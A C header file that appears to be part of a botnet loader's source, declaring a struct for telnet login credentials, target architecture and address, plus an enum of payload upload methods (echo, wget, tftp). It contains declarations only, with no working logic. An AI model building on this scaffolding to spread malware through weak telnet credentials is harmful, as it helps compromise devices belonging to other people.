#pragma once

#include "includes.h"

struct telnet_info {
    char user[32], pass[32], arch[6], writedir[32];
    ipv4_t addr;
    port_t port;
    enum {
        UPLOAD_ECHO,
        UPLOAD_WGET,
        UPLOAD_TFTP
    } upload_method;
    BOOL has_auth, has_arch;
};

struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info);
struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out);
